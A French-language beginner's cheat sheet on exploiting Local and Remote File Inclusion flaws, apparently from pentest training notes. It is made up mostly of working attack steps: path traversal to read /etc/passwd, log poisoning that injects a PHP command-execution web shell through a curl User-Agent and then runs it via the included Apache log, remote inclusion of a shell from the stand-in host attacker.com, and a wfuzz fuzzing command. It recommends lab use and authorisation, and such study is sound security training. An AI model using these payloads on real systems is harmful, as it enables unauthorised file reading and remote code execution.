# LFI/RFI (Local/Remote File Inclusion)

## Objectif
Exploiter une faille d'inclusion de fichier pour lire des fichiers sensibles (LFI) ou exécuter du code distant (RFI).

---

## Commandes essentielles et explications

### 1. Détection de la vulnérabilité LFI
- Tester des payloads dans un paramètre de fichier :
```
http://target.com/page.php?file=../../../../etc/passwd
```
- **À quoi ça sert ?** Si le contenu du fichier `/etc/passwd` s'affiche, la page est vulnérable à la LFI.
- **Astuce débutant** : Tester différents niveaux de "../" selon l'arborescence.

### 2. Exploitation avancée LFI
- Log poisoning (empoisonnement de logs pour exécuter du code) :
```
curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
http://target.com/page.php?file=../../../../var/log/apache2/access.log&cmd=id
```
- **À surveiller** : Exécution de commandes système via l'inclusion du log empoisonné.

### 3. Détection de la vulnérabilité RFI
- Tester avec une URL externe :
```
http://target.com/page.php?file=http://attacker.com/shell.txt
```
- **À quoi ça sert ?** Si le code distant est exécuté, la page est vulnérable à la RFI.
- **Astuce** : Tester avec un fichier texte simple puis un webshell.

### 4. Utilisation d'outils automatisés
```bash
wfuzz -c -w /usr/share/wordlists/wfuzz/lfi/lfi-list.txt --hh 0 "http://target.com/page.php?file=FUZZ"
```
- **wfuzz** : Fuzzer pour tester de nombreux payloads LFI automatiquement.
- **--hh 0** : Ignore les réponses vides.

---

## Conseils pour débutants
- Toujours tester d'abord en manuel, puis automatiser avec wfuzz ou ffuf.
- Ne pas négliger les logs, les fichiers de config, les backups.
- Tester sur des environnements de lab, jamais en production sans autorisation.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [OWASP LFI](https://owasp.org/www-community/attacks/Local_File_Inclusion) 